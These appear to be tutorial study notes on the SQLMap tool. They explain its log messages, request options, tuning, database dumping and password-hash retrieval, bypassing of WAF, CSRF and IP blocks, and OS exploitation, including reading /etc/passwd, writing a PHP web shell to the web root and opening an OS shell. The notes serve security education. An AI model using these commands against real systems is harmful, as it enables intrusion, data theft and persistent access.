#     SQL injection techniques to use (default "BEUSTQ")

The technique characters BEUSTQ refers to the following:

-    B: Boolean-based blind
-    E: Error-based
-    U: Union query-based
-    S: Stacked queries
-    T: Time-based blind
-    Q: Inline queries


    Note:  option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.



# Log Messages Description


#### URL content is stable
```
        Log Message:

            "target URL content is stable"

```

This means that there are no major changes between responses in case of continuous identical requests. This is important from the automation point of view since, in the event of stable responses, it is easier to spot differences caused by the potential SQLi attempts. 

        
#### Parameter appears to be dynamic
```
        Log Message:

            "GET parameter 'id' appears to be dynamic"
```
        
It is always desired for the tested parameter to be "dynamic," as it is a sign that any changes made to its value would result in a change in the response; hence the parameter may be linked to a database. 


#### Parameter might be injectable
```
        Log Message: "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"
```

As discussed before, DBMS errors are a good indication of the potential SQLi. In this case, there was a MySQL error when SQLMap sends an intentionally invalid value was used (e.g. ?id=1",)..).))'), which indicates that the tested parameter could be SQLi injectable and that the target could be MySQLIt should be noted that this is not proof of SQLi, but just an indication that the detection mechanism has to be proven in the subsequent run.


#### Parameter might be vulnerable to XSS attacks
```
        Log Message:

         "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"
```


#### Back-end DBMS is '...'
```
        Log Message:

        "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"
```



#### Level/risk values
```
        Log Message:

            "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"
```


### Reflective values found
```
        Log Message:

         "reflective value(s) found and filtering out"
```
Just a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk. However, SQLMap has filtering mechanisms to remove such junk before comparing the original page content.


#### Parameter appears to be injectable
```
        Log Message:

        "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"
```
This message indicates that the parameter appears to be injectable, though there is still a chance for it to be a false-positive finding.


#### Time-based comparison statistical model
```
        Log Message:

        "time-based comparison requires a larger statistical model, please wait........... (done)"
```

#### Extending UNION query injection technique tests
```
        Log Message:

        "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
```

UNION-query SQLi checks require considerably more requests for successful recognition of usable payload than other SQLi types. To lower the testing time per parameter, especially if the target does not appear to be injectable, the number of requests is capped to a constant value (i.e., 10) for this type of check. However, if there is a good chance that the target is vulnerable, especially as one other (potential) SQLi technique is found, SQLMap extends the default number of requests for UNION query SQLi, because of a higher expectancy of success.


#### Technique appears to be usable
```
        Log Message:

    "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"
```
As a heuristic check for the UNION-query SQLi type, before the actual UNION payloads are sent, a technique known as ORDER BY is checked for usability. In case that it is usable, SQLMap can quickly recognize the correct number of required UNION columns by conducting the binary-search approach.


#### Parameter is vulnerable
```
        Log Message:

    "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"
```


### ```Sqlmap identified injection points
```
        Log Message:

    "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"
```

Following afterthis, is a listing of all injection points with type, title, and payloads, which represents the final proof of successful detection and exploitation of found SQLi vulnerabilities. It should be noted that SQLMap lists only those findings which are provably exploitable (i.e., usable).


#### Data logged to text files
```
        Log Message:

    "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"
```


        
# Running SQLMap on an HTTP Request



## Curl Commands

One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing **Copy as cURL** feature from within the Network panel inside the Chrome, Edge, or Firefox Developer Tools.

By pasting the clipboard into the command line, and changing the curl to sqlmap, we are able to use SQLMap.





        
## GET/POST Requests

GET parameters are provided with the usage of option -u/--url, as in the previous example. As for testing POST data, the --data flag can be used, as follows:

```$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'```

Both parameters will be tested this way.
If we want to only test for one of them we can use -p name or mark it with an asterisk (*):

```$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'```

## Full HTTP Requests


- We can right-click the request within Burp and choose Copy to file. 
-  Another way of capturing the full HTTP request would be through using the browser, as mentioned earlier in the section, and choosing the option Copy > Copy Request Headers, and then pasting the request into a file.

```$ sqlmap -r req.txt```


    Tip: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.



# Custom SQLMap Requests

#### Cookie
to specify the (session) cookie value to PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c option --cookie would be used as follows:

```$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'```


#### Header
The same effect can be done with the usage of option -H/--header:

```$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'```

We can apply the same to options like --host, --referer, and -A/--user-agent, which are used to specify the same HTTP headers' values.

#### Method

```$ sqlmap -u www.target.com --data='id=1' --method PUT```

         



## Custom Post requests


Apart from the most common form-data POST body style (e.g. id=1), SQLMap also supports JSON formatted (e.g. {"id":1}) and XML formatted (e.g. `<element><id>1</id></element>`) HTTP requests.




# Handling SQLMap Errors

        

### Display Errors

switch the --parse-errors, to parse the DBMS errors (if any) and displays them as part of the programrun


### Store the Traffic

The -t option stores the whole traffic content to an output file:

```$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt```


        
### verbose output

the -v option, which raises the verbosity level of the console output

```$ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch```



### Using Proxy

we can utilize the --proxy option to redirect the whole traffic through a (MiTM) proxy (e.g., Burp).





# Attack Tuning

        
Every payload sent to the target consists of:

-  vector (e.g., UNION ALL SELECT 1,2,VERSION()): central part of the payload, carrying the useful SQL code to be executed at the target.

- boundaries (e.g. ``'<vector>-- -``): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.


## Prefix/Suffix

There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.
For such runs, options **--prefix** and **--suffix** can be used as follows:

```$ sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"```


## Level/Risk

By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.

- The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).

- The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).




## Advanced Tuning

- Status Codes

If the difference between TRUE and FALSE responses can be seen in the HTTP codes (e.g. 200 for TRUE and 500 for FALSE), the option --code could be used to fixate the detection of TRUE responses to a specific HTTP code (e.g. ```--code=200```).

        
- Titles

 If the difference between responses can be seen by inspecting the HTTP page titles, the switch --titles could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag `<title>`.


- Strings

In case of a specific string value appearing in TRUE responses (e.g. success), while absent in FALSE responses, the option --string could be used to fixate the detection based only on the appearance of that single value (e.g. `--string=success`).

        
- Text-only

When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. `<script>`, `<style>`, `<meta>`, etc.), we can use the `--text-only` switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.


- Techniques

For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option `--technique` can specify the SQLi technique to be used.

For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with `--technique=BEU`.


## UNION SQLi Tuning

If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option `--union-cols` (e.g. `--union-cols=17`). In case that the default "dummy" filling values used by SQLMap -NULL and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. `--union-char='a'`).Furthermore, in case there is a requirement to use an appendix at the end of a UNION query in the form of the FROM `<table> `(e.g., in case of Oracle), we can set it with the option `--union-from` (e.g. `--union-from=users`).





# Database Enumeration

        
## SQLMap Data Exfiltration

SQLMap has a predefined set of queries for all supported DBMSes, where each entry represents the SQL that must be run at the target to retrieve the desired content. For example, the excerpts from `/data/xml/queries.xml` for a MySQL DBMS 



## Basic DB Data Enumeration

Usually, after a successful detection of an SQLi vulnerability, we can begin the enumeration of basic details from the database, such as the hostname of the vulnerable target (``--hostname``), current user's name (`--current-user`), current database name (`--current-db`), or password hashes (`--passwords`). SQLMap will skip SQLi detection if it has been identified earlier and directly start the DBMS enumeration process.


Enumeration usually starts with the retrieval of the basic information:

-    Database version banner (switch --banner)
-    Current user name (switch --current-user)
-    Current database name (switch --current-db)
-    Checking if the current user has DBA (administrator) rights. (--is-dba)

> Note: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. 




## Table Enumeration

```$ sqlmap -u "http://www.example.com/?id=1" --tables -D {database}```

        
After spotting the table name of interest, retrieval of its content can be done by using the `--dump` option and specifying the table name with `-T users`

```$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb```

>Tip: Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.


## Table/Row Enumeration

When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only name and surname columns) with the `-C` option, as follows:

`$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`


To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the `--start` and `--stop` options (e.g., start from 2nd up to 3rd entry), as follows:

`$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3`



## Conditional Enumeration

If there is a requirement to retrieve certain rows based on a known `WHERE `condition (e.g. name LIKE 'f%'), we can use the option `--where`, as follows:

 
 `$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`


## Full DB Enumeration

the `--dump-all`switch, all the content from all the databases will be retrieved.


By simply using the switch `--dump` without specifying a table with `-T`, all of the current database content will be retrieved. 




## DB Schema Enumeration

        
If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture, we could use the switch `--schema`:

`$ sqlmap -u "http://www.example.com/?id=1" --schema`

## Searching for Data

we can search for databases, tables, and columns of interest, by using the `--search `option. This option enables us to search for identifier names by using the LIKE operator. 

`$ sqlmap -u "http://www.example.com/?id=1" --search -T user`


We could also have tried to search for all column names based on a specific keyword (e.g. pass):

`$ sqlmap -u "http://www.example.com/?id=1" --search -C pass`



## DB Users Password Enumeration and Cracking


`$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch`


>Tip: The `--all` switch in combination with the `--batch` switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.


# Bypassing Web Application Protections

        
### Anti-CSRF Token Bypass
 
SQLMap has options that can help in bypassing anti-CSRF protection. Namely, the most important option is `--csrf-token`. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.
Additionally, even in a case where the user does not explicitly specify the token's name via `--csrf-token`, if one of the provided parameters contains any of the common infixes (i.e. csrf, xsrf, token), the user will be prompted whether to update it in further requests



### Unique Value Bypass

In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the option ```--randomize``` should be used, pointing to the parameter name containing a value which should be randomized before being sent:

`$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI`


### Calculated Parameter Bypass

Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s).  To bypass this, the option `--eval` should be used, where a valid Python code is being evaluated just before the request is being sent to the target:

`$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI`


### IP Address Concealing

In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option `--proxy` (e.g. `--proxy="socks4://177.39.187.70:33283"`), where we should add a working proxy.

n addition to that, if we have a list of proxies, we can provide them to SQLMap with the option `--proxy-file`. The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes.  By using switch `--tor`, SQLMap will automatically try to find the local port and use it appropriately.

If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch `--check-tor`. 



### WAF Bypass


Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. ?pfov=...) to test for the existence of a WAF (Web Application Firewall).For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a 406 - Not Acceptable response after such a request.

SQLMap uses a third-party library identYwaf, containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether , we can use switch` --skip-waf`.



### User-agent Blacklisting Bypass


In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap 
This is trivial to bypass with the switch `--random-agent`/

### Tamper Scripts

Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.

can be chained, one after another, within the `--tamper` option (e.g. `--tamper=between,randomcase`), where they are run based on their predefined priority.A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. ifnull2ifisnull). In contrast, some tamper scripts do not care about the inner content (e.g. appendnullbyte).

Tamper scripts can modify any part of the request, although the majority change the payload content. 

|Tamper-Script         |      	Description|
|-------------|------------|
0eunion 	        |        Replaces instances of UNION with e0UNION
base64encode 	      |      Base64-encodes all characters in a given payload
between 	        |        Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #
commalesslimit 	      |      Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart
equaltolike 	   |         Replaces all occurrences of operator equal (=) with LIKE counterpart
halfversionedmorekeywords |	Adds (MySQL) versioned comment before each keyword
modsecurityversioned 	  |  Embraces complete query with (MySQL) versioned comment
modsecurityzeroversioned 	|Embraces complete query with (MySQL) zero-versioned comment
percentage 	              |  Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)
plus2concat 	         |   Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart
randomcase 	               | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
space2comment 	           | Replaces space character ( ) with comments `/
space2dash 	            |    Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)
space2hash 	             |   Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n)
space2mssqlblank 	     |   Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters
space2plus 	            |    Replaces space character ( ) with plus (+)
space2randomblank 	     |   Replaces space character ( ) with a random blank character from a valid set of alternate characters
symboliclogical 	      |  Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
versionedkeywords 	     |   Encloses each non-function keyword with (MySQL) versioned comment
versionedmorekeywords 	  |  Encloses each keyword with (MySQL) versioned comment




To get a whole list of implemented tamper scripts, along with the description as above, switch --list-tampers can be used.





# OS Exploitation


        
        SQLMap has the ability to utilize an SQL Injection to read and write files from the local system outside the DBMS. 





## Checking for DBA Privileges

`$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`


## Reading Local Files

`$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`

`$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd`

## Writing Local Files

 To do that with SQLMap, we can use the `--file-write` and `--file-dest` options. First, let's prepare a basic PHP web shell and write it into a shell.php file:


`$ echo '<?php system($_GET["cmd"]); ?>' > shell.php`


```$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"```




## OS Command Execution


SQLMap utilizes various techniques to get a remote shell through SQL injection vulnerabilities, like writing a remote shell, as we just did, writing SQL functions that execute commands and retrieve output or even using some SQL queries that directly execute OS command, like xp_cmdshell in Microsoft SQL Server.


`$ sqlmap -u "http://www.example.com/?id=1" --os-shell`
